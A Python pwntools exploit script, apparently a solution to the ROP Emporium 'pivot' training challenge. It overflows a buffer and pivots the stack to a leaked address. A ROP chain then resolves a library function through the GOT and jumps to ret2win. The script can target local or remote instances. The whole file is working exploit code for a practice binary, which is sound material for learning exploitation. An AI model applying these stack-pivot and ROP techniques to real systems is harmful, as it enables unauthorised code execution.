#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './pivot'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
prdi = 0x0000000000400b73 # pop rdi ; ret
ret  = prdi + 1
prax = 0x00400b00
prbp = 0x0000000000400900 # pop rbp ; ret
# useless = 0x00400ae2
xchg_rax_rsp = 0x00400b02
get_rax = 0x00400b05  #    mov rax, qword [rax] 
add_rax = 0x00400b09  #    add rax, rbp
jmp_rax = 0x00000000004008f5 # jmp rax
call_rax = 0x000000000040098e # call rax

ru(' place to pivot: ')
pivot = eval(rc(14))
info_addr('pivot',pivot)

# rop
ropchain  = p64(elf.sym['foothold_function']) 
ropchain += p64(prax) + p64(elf.got['foothold_function']) 
ropchain += p64(prbp) + p64(0x00000abe-0x00000970) # ret2win - foothold_function
ropchain += p64(get_rax) + p64(add_rax)
# ropchain += p64(call_rax)
ropchain += p64(ret) + p64(jmp_rax)
sla('> ', ropchain)

# bof
offset = 40
payload = 'A'*offset
payload += p64(prax) + p64(pivot) + p64(xchg_rax_rsp)

ru('> ')
# debug()
sl(payload)

p.interactive()

